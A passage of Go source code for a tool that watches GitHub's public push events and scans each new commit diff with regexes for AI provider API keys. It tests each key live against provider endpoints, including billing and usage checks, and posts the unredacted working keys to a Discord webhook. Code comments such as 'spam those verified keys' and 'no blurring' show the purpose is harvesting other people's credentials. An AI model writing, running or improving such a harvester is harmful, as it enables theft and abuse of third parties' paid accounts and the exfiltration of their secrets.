        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["models"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }

        // Check billing
        balReq, _ := http.NewRequest("GET", "https://api.cohere.ai/v1/billing/usage", nil)
        balReq.Header.Set("Authorization", "Bearer "+key)
        balResp, err := client.Do(balReq)
        if err == nil && balResp.StatusCode == 200 {
                balResp.Body.Close()
                result.Quota = "Active"
        }

        return result
}

func verifyAI21(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.ai21.com/studio/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }
        return VerifyResult{Valid: true, Details: "valid"}
}

// ─── Discord Webhook Sender (no delay — spam those verified keys) ───────────

type WebhookSender struct {
        url     string
        enabled bool
        program *tea.Program
        client  *http.Client
}

func NewWebhookSender(url string, p *tea.Program) *WebhookSender {
        return &WebhookSender{
                url:     url,
                enabled: url != "",
                program: p,
                client:  &http.Client{Timeout: 10 * time.Second},
        }
}

func providerEmoji(provider string) string {
        switch provider {
        case "openai":
                return "🤖"
        case "anthropic":
                return "🧠"
        case "mistral":
                return "🌀"
        case "openrouter":
                return "🛤️"
        case "elevenlabs":
                return "🔊"
        case "deepseek":
                return "🔮"
        case "xai":
                return "𝕏"
        case "huggingface":
                return "🤗"
        case "groq":
                return "⚡"
        case "replicate":
                return "🔁"
        case "perplexity":
                return "❓"
        case "together":
                return "🤝"
        case "fireworks":
                return "🎆"
        case "cohere":
                return "🔗"
        case "ai21":
                return "📐"
        default:
                return "🔑"
        }
}

func (w *WebhookSender) Send(match VerifiedMatch) {
        if !w.enabled {
                return
        }

        go func() {
                // Green for valid, red for invalid
                color := 0x04B575
                statusLabel := "✅ VALID"
                if match.Status != "verified" && match.Status != "regex-match (unverified)" {
                        color = 0xFF5555
                        statusLabel = "❌ INVALID"
                }

                // Full key, no blurring
                fullKey := match.Key
                if fullKey == "" {
                        fullKey = match.Redacted
                }

                emoji := providerEmoji(match.Provider)

                // Build the embed like a proper key checker bot
                fields := []DiscordEmbedField{
                        {Name: "Status", Value: statusLabel, Inline: true},
                        {Name: "Provider", Value: fmt.Sprintf("%s %s", emoji, strings.Title(match.Provider)), Inline: true},
                }

                // Key type (Project/Legacy/Live/Test/Bot)
                if match.KeyType != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Type", Value: match.KeyType, Inline: true})
                }

                // Key in code block (full, not redacted)
                keyDisplay := fullKey
                if len(keyDisplay) > 1000 {
                        keyDisplay = keyDisplay[:1000] + "..."
                }
                fields = append(fields, DiscordEmbedField{Name: "Key", Value: fmt.Sprintf("```%s```", keyDisplay), Inline: false})

                // Org / Account
                if match.Org != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🏢 Org", Value: match.Org, Inline: true})
                }

                // Models accessible
                if match.Models != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🧮 Models", Value: match.Models, Inline: true})
                }

                // Balance
                if match.Balance != "" {
                        fields = append(fields, DiscordEmbedField{Name: "💰 Balance", Value: match.Balance, Inline: true})
                }

                // Quota / Rate Limit
                if match.Quota != "" {
                        fields = append(fields, DiscordEmbedField{Name: "⚡ Quota", Value: match.Quota, Inline: true})
                }

                // Tier / Plan
                if match.Tier != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🏆 Tier", Value: match.Tier, Inline: true})
                }

                // Details (fallback for misc info)
                if match.Details != "" {
                        fields = append(fields, DiscordEmbedField{Name: "ℹ️ Details", Value: match.Details, Inline: false})
                }

                // Source
                fields = append(fields, DiscordEmbedField{Name: "📂 Repo", Value: match.Repo, Inline: true})
                fields = append(fields, DiscordEmbedField{Name: "🔗 Commit", Value: match.CommitUrl, Inline: false})

                embed := DiscordEmbed{
                        Title:       fmt.Sprintf("%s %s Key Check", emoji, strings.Title(match.Provider)),
                        Description: fmt.Sprintf("**%s** key detected and verified", strings.Title(match.Provider)),
                        Color:       color,
                        Fields:      fields,
                        Footer:      &DiscordEmbedFooter{Text: "Key Scanner | Auto-Verified"},
                }

                payload := DiscordPayload{Embeds: []DiscordEmbed{embed}}
                jsonData, err := json.Marshal(payload)
                if err != nil {
                        log.Printf("Webhook marshal error: %v", err)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "marshal error"})
                        return
                }

                resp, err := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                if err != nil {
                        log.Printf("Webhook send error: %v", err)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "request failed"})
                        return
                }
                resp.Body.Close()

                if resp.StatusCode == 429 {
                        // Discord rate limit — wait and retry once
                        log.Printf("Discord rate limited, waiting 2s...")
                        time.Sleep(2 * time.Second)
                        resp2, err2 := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                        if err2 == nil {
                                resp2.Body.Close()
                                w.program.Send(MsgWebhookResult{Success: true, Provider: match.Provider})
                        } else {
                                w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "retry failed"})
                        }
                } else if resp.StatusCode >= 300 {
                        log.Printf("Webhook returned status %d", resp.StatusCode)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: fmt.Sprintf("HTTP %d", resp.StatusCode)})
                } else {
                        w.program.Send(MsgWebhookResult{Success: true, Provider: match.Provider})
                }
        }()
}

// ─── Verification Worker Pool ───────────────────────────────────────────────

func verifyWorker(id int, p *tea.Program, rawChan <-chan RawMatch, webhook *WebhookSender, cfg Config, wg *sync.WaitGroup) {
        defer wg.Done()
        timeout := time.Duration(cfg.VerifyTimeout) * time.Second

        for raw := range rawChan {
                if !raw.CanVerify || !cfg.EnableVerify {
                        // No verification possible / disabled — just report as regex-only match
                        verified := VerifiedMatch{
                                Provider:  raw.Provider,
                                Key:       raw.Text,
                                Redacted:  redact(raw.Text, 6),
                                Valid:     true, // unverified, assume potential match
                                Status:    "regex-match (unverified)",
                                Details:   "not verified",
                                Repo:      raw.Repo,
                                CommitUrl: raw.CommitUrl,
                        }
                        p.Send(MsgVerifiedMatch{
                                Provider:   verified.Provider,
                                Key:        verified.Key,
                                Redacted:   verified.Redacted,
                                Valid:      verified.Valid,
                                Status:     verified.Status,
                                Details:    verified.Details,
                                Balance:    verified.Balance,
                                Quota:      verified.Quota,
                                Tier:       verified.Tier,
                                KeyType:    verified.KeyType,
                                Org:        verified.Org,
                                Models:     verified.Models,
                                Repo:       verified.Repo,
                                CommitUrl:  verified.CommitUrl,
                        })
                        continue
                }

                vr := verifyKey(raw.Provider, raw.Text, timeout)

                verified := VerifiedMatch{
                        Provider:   raw.Provider,
                        Key:        raw.Text,
                        Redacted:   redact(raw.Text, 6),
                        Valid:      vr.Valid,
                        Status:     "verified",
                        Details:    vr.Details,
                        Balance:    vr.Balance,
                        Quota:      vr.Quota,
                        Tier:       vr.Tier,
                        KeyType:    vr.KeyType,
                        Org:        vr.Org,
                        Models:     vr.Models,
                        Repo:       raw.Repo,
                        CommitUrl:  raw.CommitUrl,
                }
                if !vr.Valid {
                        verified.Status = "invalid"
                }

                // Send to TUI (both valid and invalid)
                p.Send(MsgVerifiedMatch{
                        Provider:   verified.Provider,
                        Key:        verified.Key,
                        Redacted:   verified.Redacted,
                        Valid:      verified.Valid,
                        Status:     verified.Status,
                        Details:    verified.Details,
                        Balance:    verified.Balance,
                        Quota:      verified.Quota,
                        Tier:       verified.Tier,
                        KeyType:    verified.KeyType,
                        Org:        verified.Org,
                        Models:     verified.Models,
                        Repo:       verified.Repo,
                        CommitUrl:  verified.CommitUrl,
                })

                // Send to Discord webhook — ONLY verified (valid) keys
                if vr.Valid && cfg.DiscordWebhook != "" {
                        webhook.Send(verified)
                }
        }
}

// ─── Scanner Worker ─────────────────────────────────────────────────────────

func scanWorker(id int, p *tea.Program, jobs <-chan ScanJob, rules []Rule, rawChan chan<- RawMatch, tokenPool *TokenPool) {
        client := &http.Client{Timeout: 30 * time.Second}
        for job := range jobs {
                p.Send(MsgScanStarted{CommitUrl: job.CommitUrl})
                req, err := http.NewRequest("GET", job.CommitUrl, nil)
                if err != nil {
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }
                req.Header.Set("User-Agent", "scanner")
                req.Header.Set("Accept", "application/vnd.github.v3.diff")
                token := tokenPool.Next()
                if token != "" {
                        req.Header.Set("Authorization", "Bearer "+token)
                }

                resp, err := client.Do(req)
                if err != nil {
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }

                if resp.StatusCode != http.StatusOK {
                        resp.Body.Close()
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }

                scanner := bufio.NewScanner(resp.Body)
                lineNumber := 0

                for scanner.Scan() {
                        lineNumber++
                        lineText := scanner.Text()

                        // Only scan added lines in the diff (lines starting with +, not +++ headers)
                        if len(lineText) > 0 && lineText[0] == '+' && (len(lineText) < 3 || lineText[:3] != "+++") {
                                for _, rule := range rules {
                                        if rule.Regex.MatchString(lineText) {
                                                key := extractKey(lineText, &rule)
                                                if key == "" {
                                                        key = rule.Regex.FindString(lineText)
                                                }
                                                if key != "" {
                                                        rawChan <- RawMatch{
                                                                Rule:      rule.Name,
                                                                Provider:  rule.Provider,
                                                                Text:      key,
                                                                Repo:      job.RepoName,
                                                                CommitUrl: job.CommitUrl,
                                                                CanVerify: rule.CanVerify,
                                                        }
                                                        p.Send(MsgRawMatchFound{
                                                                Rule:      rule.Name,
                                                                Provider:  rule.Provider,
                                                                Text:      key,
                                                                Repo:      job.RepoName,
                                                                CommitUrl: job.CommitUrl,
                                                                CanVerify: rule.CanVerify,
                                                        })
                                                }
                                        }
                                }
                        }
                }
                resp.Body.Close()
                p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
        }
}

// ─── Build Default Rules ────────────────────────────────────────────────────

func buildDefaultRules() []struct {
        Name      string
        Pattern   string
        Provider  string
        CanVerify bool
} {
        return []struct {
                Name      string
                Pattern   string
                Provider  string
                CanVerify bool
        }{
                // ═══════════════════════════════════════════════════════════════════
                // ── AI / LLM Providers ONLY — no false positives ──
                // ═══════════════════════════════════════════════════════════════════

                // OpenAI — two patterns: new project keys and legacy keys
                {"OpenAI API Key (project)", `sk-proj-[A-Za-z0-9_-]{40,}`, "openai", true},
                {"OpenAI API Key (legacy)", `sk-[A-Za-z0-9]{48}`, "openai", true},
                {"OpenAI Key in .env", `(?:OPENAI_API_KEY|openai_api_key)\s*[=:]\s*["']?sk-[A-Za-z0-9_-]{20,}`, "openai", true},

                // Anthropic — distinctive sk-ant- prefix
                {"Anthropic API Key", `sk-ant-api03-[A-Za-z0-9\-_]{80,}`, "anthropic", true},
                {"Anthropic API Key (short)", `sk-ant-[A-Za-z0-9\-_]{20,}`, "anthropic", true},
                {"Anthropic Key in .env", `(?:ANTHROPIC_API_KEY|anthropic_api_key)\s*[=:]\s*["']?sk-ant-[A-Za-z0-9\-_]{20,}`, "anthropic", true},

                // Mistral — only match in env context (too generic standalone)
                {"Mistral Key in .env", `(?:MISTRAL_API_KEY|mistral_api_key)\s*[=:]\s*["']?[A-Za-z0-9]{20,}`, "mistral", true},

                // OpenRouter — distinctive sk-or-v1- prefix
                {"OpenRouter API Key", `sk-or-v1-[a-z0-9]{64}`, "openrouter", true},

                // ElevenLabs — distinctive sk_ prefix (lowercase only)
                {"ElevenLabs API Key", `sk_[a-z0-9]{48}`, "elevenlabs", true},

                // DeepSeek — sk- followed by exactly 32 hex chars
                {"DeepSeek API Key", `sk-[a-f0-9]{32}`, "deepseek", true},

                // xAI / Grok — distinctive xai- prefix
                {"xAI / Grok API Key", `xai-[A-Za-z0-9]{80}`, "xai", true},

                // HuggingFace — distinctive hf_ prefix
                {"HuggingFace API Token", `hf_[A-Za-z0-9]{34}`, "huggingface", true},

                // Groq — distinctive gsk_ prefix
                {"Groq API Key", `gsk_[A-Za-z0-9]{48,}`, "groq", true},

                // Together AI — only match in env context
                {"Together AI Key in .env", `(?:TOGETHER_API_KEY|together_api_key)\s*[=:]\s*["']?[a-f0-9]{64}`, "together", true},

                // Replicate — distinctive r8_ prefix
                {"Replicate API Token", `r8_[A-Za-z0-9]{30,}`, "replicate", true},

                // Perplexity — distinctive pplx- prefix
                {"Perplexity API Key", `pplx-[a-f0-9]{48}`, "perplexity", true},

                // Fireworks AI — distinctive fw_ prefix
                {"Fireworks AI Key", `fw_[A-Za-z0-9]{30,}`, "fireworks", true},

                // Cohere — only match in env context
                {"Cohere Key in .env", `(?:COHERE_API_KEY|cohere_api_key)\s*[=:]\s*["']?[A-Za-z0-9]{40}`, "cohere", true},

                // AI21 Labs — only match in env context
                {"AI21 Key in .env", `(?:AI21_API_KEY|ai21_api_key)\s*[=:]\s*["']?[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}`, "ai21", true},
        }
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
        // Redirect logger to file so it doesn't mess up the TUI
        logFile, err := os.OpenFile("scanner.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0666)
        if err != nil {
                log.SetOutput(io.Discard)
        } else {
                log.SetOutput(logFile)
                defer logFile.Close()
        }

        var cfg Config
        if err := initViper(&cfg); err != nil {
                log.Printf("failed to init viper: %v", err)
        }

        // ── Build Rules ──
        var rules []Rule

        // If user defined signatures in config, use those
        if len(cfg.Signatures) > 0 {
                for name, pattern := range cfg.Signatures {
                        compiled, err := regexp.Compile(pattern)
                        if err != nil {
                                log.Fatalf("Invalid regex %s: %v", pattern, err)
                        }
                        // Try to detect provider from name for verification
                        provider := detectProvider(name, pattern)
                        canVerify := isVerifiable(provider)
                        rules = append(rules, Rule{
                                Name:      name,
                                Regex:     compiled,
                                CanVerify: canVerify,
                                Provider:  provider,
                        })
                }
        } else {
                // Use built-in comprehensive rules
                defaults := buildDefaultRules()
                for _, d := range defaults {
                        compiled, err := regexp.Compile(d.Pattern)
                        if err != nil {
                                log.Printf("Skipping invalid default regex %s: %v", d.Pattern, err)
                                continue
                        }
                        rules = append(rules, Rule{
                                Name:      d.Name,
                                Regex:     compiled,
                                CanVerify: d.CanVerify,
                                Provider:  d.Provider,
                        })
                }
        }
        log.Printf("Loaded %d rules (%d verifiable)", len(rules), countVerifiable(rules))

        // ── Token Pool ──
        tokenPool := NewTokenPool(cfg.GitHubToken)
        log.Printf("Token pool: %d GitHub tokens loaded", tokenPool.Count())

        // ── Channels ──
        scanJobs := make(chan ScanJob, 200)
        rawMatches := make(chan RawMatch, 500)

        // ── TUI ──
        numScanWorkers := 100
        numVerifyWorkers := cfg.VerifyWorkers
        if numVerifyWorkers < 1 {
                numVerifyWorkers = 20
        }

        initialModel := tuiModel{
                status:        "Initializing...",
                activeWorkers: numScanWorkers + numVerifyWorkers,
                tokenCount:    tokenPool.Count(),
        }
        p := tea.NewProgram(initialModel)

        // ── Webhook (needs p for TUI feedback) ──
        webhook := NewWebhookSender(cfg.DiscordWebhook, p)

        // ── Start scan workers ──
        for w := 1; w <= numScanWorkers; w++ {
                go scanWorker(w, p, scanJobs, rules, rawMatches, tokenPool)
        }
        log.Printf("Started %d scanning workers (%d tokens rotating)", numScanWorkers, tokenPool.Count())

        // ── Start verify workers ──
        var verifyWg sync.WaitGroup
        for w := 1; w <= numVerifyWorkers; w++ {
                verifyWg.Add(1)
                go verifyWorker(w, p, rawMatches, webhook, cfg, &verifyWg)
        }
        log.Printf("Started %d verification workers", numVerifyWorkers)

        // ── GitHub Events Poller ──
        go func() {
                client := &http.Client{Timeout: 30 * time.Second}
                url := "https://api.github.com/events?per_page=100"
                var lastETag string
                pollInterval := 60 * time.Second
                processedCommits := make(map[string]bool)

                for {
                        p.Send(MsgStatusUpdate{Status: "Fetching events..."})
                        req, _ := http.NewRequest("GET", url, nil)
                        req.Header.Set("User-Agent", "scanner")
                        token := tokenPool.Next()
                        if token != "" {
                                req.Header.Set("Authorization", "Bearer "+token)
                        }
                        if lastETag != "" {
                                req.Header.Add("If-None-Match", lastETag)
                        }
                        resp, err := client.Do(req)
                        if err != nil {
                                log.Printf("Error fetching events: %v", err)
                                p.Send(MsgStatusUpdate{Status: fmt.Sprintf("Error fetching events: %v", err)})
                                time.Sleep(pollInterval)
                                continue
                        }

                        // Parse Rate Limits
                        if limitStr := resp.Header.Get("X-Ratelimit-Limit"); limitStr != "" {
                                var limit, remain int
                                fmt.Sscanf(limitStr, "%d", &limit)
                                if remainStr := resp.Header.Get("X-Ratelimit-Remaining"); remainStr != "" {
                                        fmt.Sscanf(remainStr, "%d", &remain)
                                        p.Send(MsgRateLimit{Limit: limit, Remaining: remain})
                                }
                        }

                        if resp.StatusCode == http.StatusNotModified {
                                resp.Body.Close()
                                p.Send(MsgStatusUpdate{Status: "Events not modified."})
                                time.Sleep(pollInterval)
                                continue
                        }
                        if resp.StatusCode != http.StatusOK {
                                log.Printf("Unexpected status code fetching events: %d", resp.StatusCode)
                                p.Send(MsgStatusUpdate{Status: fmt.Sprintf("HTTP %d error", resp.StatusCode)})
                                resp.Body.Close()
                                time.Sleep(pollInterval)
                                continue
                        }
                        lastETag = resp.Header.Get("ETag")

                        var events []map[string]any
                        if err := json.NewDecoder(resp.Body).Decode(&events); err != nil {
                                log.Printf("Error unmarshalling events: %v", err)
                                resp.Body.Close()
                                time.Sleep(pollInterval)
                                continue
                        }
                        resp.Body.Close()

                        p.Send(MsgStatusUpdate{Status: "Processing events..."})
                        newCommitsCount := 0
                        for _, event := range events {
                                eventType, _ := event["type"].(string)
                                if eventType != "PushEvent" {
                                        continue
                                }
                                repo, _ := event["repo"].(map[string]any)
                                repoName, _ := repo["name"].(string)
                                payload, _ := event["payload"].(map[string]any)
                                sha, ok := payload["head"].(string)
                                if !ok || sha == "" {
                                        continue
                                }
                                if processedCommits[sha] {
                                        continue
                                }
                                processedCommits[sha] = true
                                newCommitsCount++

                                patchUrl := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repoName, sha)
                                scanJobs <- ScanJob{
                                        RepoName:  repoName,
                                        CommitUrl: patchUrl,
                                }
                        }
                        p.Send(MsgFetchedCommits{Count: newCommitsCount})
                        p.Send(MsgStatusUpdate{Status: fmt.Sprintf("Fetched %d events (%d new push commits)", len(events), newCommitsCount)})

                        if intervalStr := resp.Header.Get("X-Poll-Interval"); intervalStr != "" {
                                if duration, err := time.ParseDuration(intervalStr + "s"); err == nil {
                                        pollInterval = duration
                                }
                        }

                        time.Sleep(pollInterval)
                }
        }()

        if _, err := p.Run(); err != nil {
                log.Printf("Error running TUI: %v", err)
                os.Exit(1)
        }
}

// ─── Provider Detection Helpers ─────────────────────────────────────────────

func detectProvider(name, pattern string) string {
        n := strings.ToLower(name)
        p := strings.ToLower(pattern)

        switch {
        case strings.Contains(n, "openai") || strings.Contains(p, "sk-[a-za-z0-9_-]"):
                return "openai"
        case strings.Contains(n, "anthropic") || strings.Contains(p, "sk-ant-"):
                return "anthropic"
        case strings.Contains(n, "mistral"):
                return "mistral"
        case strings.Contains(n, "openrouter") || strings.Contains(p, "sk-or-"):
                return "openrouter"
        case strings.Contains(n, "elevenlabs") || strings.Contains(p, "xi-api-key"):
                return "elevenlabs"
        case strings.Contains(n, "deepseek"):
                return "deepseek"
        case strings.Contains(n, "xai"):
                return "xai"
        case strings.Contains(n, "github") || strings.Contains(p, "ghp_") || strings.Contains(p, "gho_") || strings.Contains(p, "github_pat_"):
                return "github"
        case strings.Contains(n, "aws") || strings.Contains(p, "akia"):
                return "aws"
        case strings.Contains(n, "azure"):
                return "azure"
        case strings.Contains(n, "stripe") || strings.Contains(p, "sk_live") || strings.Contains(p, "rk_live"):
                return "stripe"
        case strings.Contains(n, "slack") || strings.Contains(p, "xox"):
                return "slack"
        case strings.Contains(n, "telegram") || strings.Contains(p, "telegram"):
                return "telegram"
        case strings.Contains(n, "heroku"):
                return "heroku"
        case strings.Contains(n, "cloudflare"):
                return "cloudflare"
        case strings.Contains(n, "private key") || strings.Contains(p, "private key"):
                return "private_key"
        case strings.Contains(n, "jwt") || strings.Contains(p, "eyj"):
                return "jwt"
        default:
                return "unknown"
        }
}

func isVerifiable(provider string) bool {
        switch provider {
        case "openai", "anthropic", "mistral", "openrouter",
                "elevenlabs", "deepseek", "xai", "huggingface", "groq",
                "replicate", "perplexity", "together", "fireworks",
                "cohere", "ai21":
                return true
        default:
                return false
        }
}

func countVerifiable(rules []Rule) int {
        count := 0
        for _, r := range rules {
                if r.CanVerify {
                        count++
                }
        }
        return count
}
